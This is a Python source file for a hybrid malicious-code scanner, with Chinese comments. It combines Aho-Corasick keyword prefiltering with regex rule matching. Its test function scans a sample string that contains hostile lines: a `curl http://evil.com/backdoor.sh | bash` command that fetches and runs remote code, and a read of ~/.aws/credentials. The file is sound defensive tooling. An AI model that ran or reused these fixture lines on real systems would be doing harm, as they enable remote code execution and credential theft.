#!/usr/bin/env python3
"""
混合扫描器 - Aho-Corasick 预筛选 + Regex 精匹配

架构:
1. Aho-Corasick 自动机快速预筛选（0.5ms）
   - 提取所有规则的关键词
   - 一次遍历匹配所有关键词
   - 返回候选攻击类型

2. Regex 引擎精匹配（2ms）
   - 只匹配候选攻击类型的规则
   - 保持 100% 检测精度
"""

import ahocorasick
import re
import time
from typing import Dict, List, Set, Tuple
from pathlib import Path


class HybridRuleEngine:
    """
    混合规则引擎
    
    使用 Aho-Corasick 预筛选 + Regex 精匹配
    """
    
    def __init__(self, rules_file: Path):
        """
        初始化混合引擎
        
        Args:
            rules_file: 规则文件路径（JSON 格式）
        """
        self.rules_file = rules_file
        self.rules = []
        self.rules_by_category = {}
        self.automaton = None
        self.keywords = set()
        
        self._load_rules()
        self._build_automaton()
        self._group_rules_by_category()
    
    def _load_rules(self):
        """加载规则文件"""
        import json
        
        with open(self.rules_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        self.rules = data.get('rules', [])
        print(f"✅ 加载 {len(self.rules)} 条规则")
    
    def _extract_keywords(self, pattern: str) -> List[str]:
        """
        从 regex pattern 提取关键词
        
        Args:
            pattern: 正则表达式
        
        Returns:
            关键词列表
        """
        keywords = []
        
        # 移除 regex 特殊字符，提取纯文本关键词
        # 例如：r'curl\s+\|.*bash' -> ['curl', 'bash']
        
        # 1. 提取明显的关键词（字母数字组合，长度>=3）
        import re
        words = re.findall(r'[a-zA-Z0-9_]{3,}', pattern)
        
        # 2. 过滤掉太常见的词
        common_words = {'the', 'and', 'for', 'not', 'with', 'from', 'import', 'def', 'return'}
        keywords = [w for w in words if w.lower() not in common_words]
        
        return keywords
    
    def _build_automaton(self):
        """构建 Aho-Corasick 自动机"""
        print("🔧 构建 Aho-Corasick 自动机...")
        start = time.time()
        
        self.automaton = ahocorasick.Automaton()
        
        # 为每条规则添加关键词到自动机
        for i, rule in enumerate(self.rules):
            patterns = rule.get('patterns', [])
            category = rule.get('category', 'unknown')
            rule_id = rule.get('id', f'RULE-{i}')
            
            for pattern in patterns:
                # 提取关键词
                keywords = self._extract_keywords(pattern)
                
                for keyword in keywords:
                    # 添加到自动机：(keyword, (rule_id, category, pattern))
                    self.automaton.add_word(keyword.lower(), (rule_id, category, pattern, keyword))
                    self.keywords.add(keyword.lower())
        
        # 构建自动机（构建失败函数）
        self.automaton.make_automaton()
        
        elapsed = (time.time() - start) * 1000
        print(f"✅ 自动机构建完成 ({elapsed:.1f}ms)")
        print(f"   关键词数：{len(self.keywords)}")
        print(f"   自动机大小：{len(self.automaton)}")
    
    def _group_rules_by_category(self):
        """按攻击类型分组规则"""
        self.rules_by_category = {}
        
        for rule in self.rules:
            category = rule.get('category', 'unknown')
            if category not in self.rules_by_category:
                self.rules_by_category[category] = []
            self.rules_by_category[category].append(rule)
        
        print(f"✅ 规则分组完成 ({len(self.rules_by_category)} 个类别)")
    
    def scan(self, content: str) -> Dict:
        """
        扫描内容（混合匹配）
        
        Args:
            content: 待扫描内容
        
        Returns:
            扫描结果字典
        """
        start = time.time()
        
        # Step 1: Aho-Corasick 预筛选（快速）
        candidate_categories = self._prefilter(content)
        
        # Step 2: Regex 精匹配（只匹配候选类别）
        matches = self._refine_match(content, candidate_categories)
        
        elapsed = (time.time() - start) * 1000
        
        return {
            'hit_count': len(matches),
            'matches': matches,
            'candidate_categories': list(candidate_categories),
            'scan_time_ms': elapsed
        }
    
    def _prefilter(self, content: str) -> Set[str]:
        """
        Aho-Corasick 预筛选
        
        Args:
            content: 待扫描内容
        
        Returns:
            候选攻击类型集合
        """
        candidate_categories = set()
        content_lower = content.lower()
        
        # 一次遍历匹配所有关键词
        for end_idx, (rule_id, category, pattern, keyword) in self.automaton.iter(content_lower):
            candidate_categories.add(category)
        
        return candidate_categories
    
    def _refine_match(self, content: str, candidate_categories: Set[str]) -> List[Dict]:
        """
        Regex 精匹配
        
        Args:
            content: 待扫描内容
            candidate_categories: 候选攻击类型
        
        Returns:
            匹配结果列表
        """
        matches = []
        
        # 只匹配候选类别的规则
        for category in candidate_categories:
            rules = self.rules_by_category.get(category, [])
            
            for rule in rules:
                patterns = rule.get('patterns', [])
                rule_id = rule.get('id', 'UNKNOWN')
                name = rule.get('name', 'Unknown Rule')
                confidence = rule.get('confidence', 80)
                severity = rule.get('severity', 'MEDIUM')
                
                for pattern in patterns:
                    try:
                        compiled = re.compile(pattern, re.IGNORECASE)
                        match_obj = compiled.search(content)
                        
                        if match_obj:
                            matches.append({
                                'rule_id': rule_id,
                                'name': name,
                                'category': category,
                                'confidence': confidence,
                                'severity': severity,
                                'pattern': pattern,
                                'match': match_obj.group(0)[:100]  # 截取前 100 字符
                            })
                    except re.error as e:
                        # 忽略无效的正则
                        pass
        
        return matches
    
    def get_stats(self) -> Dict:
        """获取统计信息"""
        return {
            'total_rules': len(self.rules),
            'total_keywords': len(self.keywords),
            'automaton_size': len(self.automaton),
            'categories': len(self.rules_by_category)
        }


def test_hybrid_scanner():
    """测试混合扫描器"""
    print("="*60)
    print("混合扫描器测试")
    print("="*60)
    
    rules_file = Path(__file__).parent.parent.parent / 'rules' / 'dist' / 'all_rules.json'
    
    if not rules_file.exists():
        print(f"❌ 规则文件不存在：{rules_file}")
        return
    
    # 创建引擎
    engine = HybridRuleEngine(rules_file)
    
    # 测试内容
    test_content = """
    #!/usr/bin/env python3
    import os
    import requests
    
    # Supply chain attack
    response = requests.get('http://evil.com/malicious.sh')
    os.system('curl http://evil.com/backdoor.sh | bash')
    
    # Credential theft
    with open('~/.aws/credentials') as f:
        aws_key = f.read()
    """
    
    print("\n📝 测试内容:")
    print(test_content[:200])
    print("...")
    
    # 扫描
    print("\n🔍 开始扫描...")
    result = engine.scan(test_content)
    
    print(f"\n📊 扫描结果:")
    print(f"  候选类别：{result['candidate_categories']}")
    print(f"  匹配数：{result['hit_count']}")
    print(f"  耗时：{result['scan_time_ms']:.2f}ms")
    
    print(f"\n🎯 匹配详情:")
    for match in result['matches'][:10]:
        print(f"  [{match['severity']}] {match['rule_id']}: {match['name']}")
        print(f"     类别：{match['category']}, 置信度：{match['confidence']}")
        print(f"     匹配：{match['match'][:50]}...")
    
    # 性能统计
    stats = engine.get_stats()
    print(f"\n📈 性能统计:")
    print(f"  规则数：{stats['total_rules']}")
    print(f"  关键词数：{stats['total_keywords']}")
    print(f"  自动机大小：{stats['automaton_size']}")
    print(f"  类别数：{stats['categories']}")


if __name__ == '__main__':
    test_hybrid_scanner()
